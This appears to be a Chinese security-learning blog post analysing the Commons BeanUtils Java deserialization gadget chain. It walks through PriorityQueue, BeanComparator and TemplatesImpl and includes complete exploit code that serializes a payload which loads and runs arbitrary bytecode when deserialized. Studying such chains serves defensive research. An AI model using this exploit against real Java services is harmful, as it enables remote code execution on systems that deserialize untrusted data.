---
title: java反序列化之CB
date: 2026-05-21
---

# java反序列化之CB

## CommonsBeanUtils 简介

Apache Commons 工具集下除了 `collections` 以外还有 `BeanUtils` ，它主要用于操控 `JavaBean` 。

先说说什么是 JavaBean。

一般 JavaBean 的格式就是`private`的字段和对字段进行读写操作的`public`方法，最常见的就是`getter`和`setter`。

CommonsBeanUtils 这个包也可以操作 JavaBean，例如：

```java
public class Baby {  
    private String name = "abc";  
  
    public String getName(){  
        return name;  
	}  
  
    public void setName (String name) {  
        this.name = name;  
	}  
}
```

这里定义了两个简单的`getter`和`setter`，如果用`@Lombok`的注解也是一样的，使用 `@Lombok` 的注解不需要写 `getter`和`setter`。例如：

```java
@Data  // 或者 @Getter @Setter
public class User {
    private String name;
    private int age;
    // 不需要写 getter/setter，Lombok 会在编译时自动生成
}
```

Commons-BeanUtils 中提供了一个静态方法 `PropertyUtils.getProperty`，让使用者可以直接调用任意 JavaBean 的 `getter` 方法，示例如下：

```java
package org.example;

import org.apache.commons.beanutils.PropertyUtils;

public class test {
    public static void main(String[] args) throws Exception{
        System.out.println(PropertyUtils.getProperty(new Baby(),"name"));
    }
}
```

此时，Commons-BeanUtils 会自动找到`name`属性的`getter`，然后调用并获得返回值。这种形式是有可能实现任意函数调用的。

## CB 链分析

### 链尾

链子的尾部是通过`TemplatesImpl`动态加载字节码进行攻击的，来看一下链子：

```java
TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->

TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()

-> TransletClassLoader#defineClass()
```

在链子的开头`TemplatesImpl#getOutputProperties()`这个方法就是一个`getter`，而且作用域是`public`，所以可以通过 CommonsBeanUtils 中的 `PropertyUtils.getProperty()` 方式获取。

所以我们这里的`PropertyUtils.getProperty()`的参数应该这么传：

```java
// 伪代码
PropertyUtils.getProperty(TemplatesImpl, outputProperties)
```

### 中间部分

接下来看看谁调用了`PropertyUtils.getProperty()`。`BeanComparator.compare()`中调用了`PropertyUtils.getProperty`方法，而这个方法经常被其他方法调用。继续找谁调用了`compare()`方法，参考之前的链子，这里用`PriorityQueue`这个类，这个类的`siftDownUsingComparator()` 方法调用了 `compare()`。

```java
private void siftDownUsingComparator(int k, E x) {
        int half = size >>> 1;
        while (k < half) {
            int child = (k << 1) + 1;
            Object c = queue[child];
            int right = child + 1;
            if (right < size &&
                comparator.compare((E) c, (E) queue[right]) > 0)
                c = queue[child = right];
            if (comparator.compare(x, (E) c) <= 0)
                break;
            queue[k] = c;
            k = child;
        }
        queue[k] = x;
    }
```

剩下的就和 CC4、CC2的一样了，回顾一下调用链：

```java
PriorityQueue.readObject()
PriorityQueue.heapify()  ->
	
	PriorityQueue.siftDown()
	PriorityQueue.siftDownUsingComparator() ->
	
		BeanComparator.compare() ->
PropertyUtils.getProperty(TemplatesImpl, outputProperties)
	->
			TemplatesImpl.getOutputProperties()
			TemplatesImpl.newTransformer()
			TemplatesImpl.getTransletInstance()
			TemplatesImpl.defineTransletClasses()
```

## CB 链 EXP 编写

### 尾部——利用 TemplatesImpl 动态加载字节码

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.PropertyUtils;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class test {

    public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("D:\\java安全学习过程中的测试代码\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_name","abc");
        setFieldValue(templates,"_bytecodes",new byte[][]{code});
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        templates.newTransformer();
    }
}
```

这里和之前的 CC4、CC2 相比用函数简化了一部分代码。

### 中间 EXP

先看一下`BeanComparator.compare()`方法：

```java
public int compare( T o1, T o2 ) {

        if ( property == null ) {
            // compare the actual objects
            return internalCompare( o1, o2 );
        }

        try {
            Object value1 = PropertyUtils.getProperty( o1, property );
            Object value2 = PropertyUtils.getProperty( o2, property );
            return internalCompare( value1, value2 );
        }
        catch ( IllegalAccessException iae ) {
            throw new RuntimeException( "IllegalAccessException: " + iae.toString() );
        }
        catch ( InvocationTargetException ite ) {
            throw new RuntimeException( "InvocationTargetException: " + ite.toString() );
        }
        catch ( NoSuchMethodException nsme ) {
            throw new RuntimeException( "NoSuchMethodException: " + nsme.toString() );
        }
    }
```

先判断`this.property`是否为空，如果为空，则直接比较两个对象；如果不为空，则调用`PropertyUtils.getProperty()`分别取两个对象的`this.property`属性并比较值。

如果需要传值比较，就要新建一个`PriorityQueue`队列，并让其有两个值进行比较，而且`PriorityQueue`的构造函数当中就包含了一个比较器。

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class test {

    public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("D:\\java安全学习过程中的测试代码\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_name","abc");
        setFieldValue(templates,"_bytecodes",new byte[][]{code});
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        //templates.newTransformer();

        final BeanComparator<Object> beanComparator = new BeanComparator<>();
        setFieldValue(beanComparator, "property", "outputProperties");
        final PriorityQueue<Object> queue = new PriorityQueue<>(2, beanComparator);
        queue.add(templates);
        queue.add(templates);
    }
}
```

成功弹出计算器。

### 结合入口的 EXP

我们需要控制在序列化的时候不弹出计算器，在反序列化的时候弹出计算器，所以通过反射来修改值。

因为在`add`时就会触发`compare()`方法，所以我们先给`add`传无关量，然后反射修改。

完整 EXP：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.beanutils.PropertyUtils;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class test {

    public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("D:\\java安全学习过程中的测试代码\\Calc.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_name","abc");
        setFieldValue(templates,"_bytecodes",new byte[][]{code});
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        //templates.newTransformer();

        final BeanComparator<Object> beanComparator = new BeanComparator<>();

        final PriorityQueue<Object> queue = new PriorityQueue<>(2, beanComparator);
        queue.add(1);
        queue.add(1);

        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue,"queue",new Object[]{templates,templates});
        serialize(queue);
        unserialize("ser.bin");
    }
}
```

接下来理清链子的逻辑：

1. 反序列化时，调用了`PriorityQueue`的`readObject()`方法：
   ```java
   private void readObject(java.io.ObjectInputStream s)
           throws java.io.IOException, ClassNotFoundException {
           // Read in size, and any hidden stuff
           s.defaultReadObject();
   
           // Read in (and discard) array length
           s.readInt();
   
           queue = new Object[size];
   
           // Read in all elements.
           for (int i = 0; i < size; i++)
               queue[i] = s.readObject();
   
           // Elements are guaranteed to be in "proper order", but the
           // spec has never explained what that might be.
           heapify();
       }
   ```

   读取到两个`TemplatesImpl`对象并放到新的数组中，然后调用`heapify()`进行重建。这就是为什么会有`setFieldValue(queue,"queue",new Object[]{templates,templates})`这一步。此时`PriorityQueue`的内部状态为：数组中有两个`TemplatesImpl`对象，`size`属性为2，`comparator`属性为`beanComparator`。

2. 然后调用`heapify()`方法：
   ```java
   private void heapify() {
           for (int i = (size >>> 1) - 1; i >= 0; i--)  //这里计算后i=0
               siftDown(i, (E) queue[i]);  //siftDown(0,queue[0])
       }
   ```

   其中调用了`siftDown(0, templates)`：
   ```java
   private void siftDown(int k, E x) {
           if (comparator != null)
               siftDownUsingComparator(k, x);
           else
               siftDownComparable(k, x);
       }
   ```

   由于一开始已经传入`comparator`，所以会调用`siftDownUsingComparator(0, templates)`：
   ```java
   private void siftDownUsingComparator(int k, E x) {
           int half = size >>> 1;   //half=1
           while (k < half) {
               int child = (k << 1) + 1;  //=1
               Object c = queue[child];//queue[1] = templates
               int right = child + 1;//=2
               if (right < size &&
                   comparator.compare((E) c, (E) queue[right]) > 0)
                   c = queue[child = right];
               if (comparator.compare(x, (E) c) <= 0)  //此处调用
                   break;
               queue[k] = c;
               k = child;
           }
           queue[k] = x;
       }
   ```

   此时就会调用`beanComparator.compare(templates, templates)`。

3. 进入`BeanComparator.compare()`阶段：
   ```java
   public int compare( T o1, T o2 ) {
   
           if ( property == null ) {
               // compare the actual objects
               return internalCompare( o1, o2 );
           }
   
           try {
               Object value1 = PropertyUtils.getProperty( o1, property );
               Object value2 = PropertyUtils.getProperty( o2, property );
               return internalCompare( value1, value2 );
           }
           catch ( IllegalAccessException iae ) {
               throw new RuntimeException( "IllegalAccessException: " + iae.toString() );
           }
           catch ( InvocationTargetException ite ) {
               throw new RuntimeException( "InvocationTargetException: " + ite.toString() );
           }
           catch ( NoSuchMethodException nsme ) {
               throw new RuntimeException( "NoSuchMethodException: " + nsme.toString() );
           }
       }
   ```

   在 EXP 中我们已经反射将`property`设置为`outputProperties`，所以就会调用`PropertyUtils.getProperty(templates, "outputProperties")`，从而达到了我们在分析时想要的效果。

至此，利用链思路梳理完毕。

接下来是对部分 EXP 代码的解释：

```java
final PriorityQueue<Object> queue = new PriorityQueue<>(2, beanComparator);
```

这里传了一个2，来看一下构造器：

```java
public PriorityQueue(int initialCapacity,
                         Comparator<? super E> comparator) {
        // Note: This restriction of at least one is not actually needed,
        // but continues for 1.5 compatibility
        if (initialCapacity < 1)
            throw new IllegalArgumentException();
        this.queue = new Object[initialCapacity];
        this.comparator = comparator;
    }
```

这个构造器中对`queue`这个数组进行一个初始化，确定要放几个恶意类，和 EXP 中反射修改该数组对应。

## 总结

这个链子正着看其实很好理解，但是反着来推比正着来读还是要难一点的。目前我找链子的理解就是：先主要看对应方法的调用，找完这个链子之后再把对应参数放进去，从入口开始推一遍，确定其中的参数传递没有问题并且能够实现调用即可。













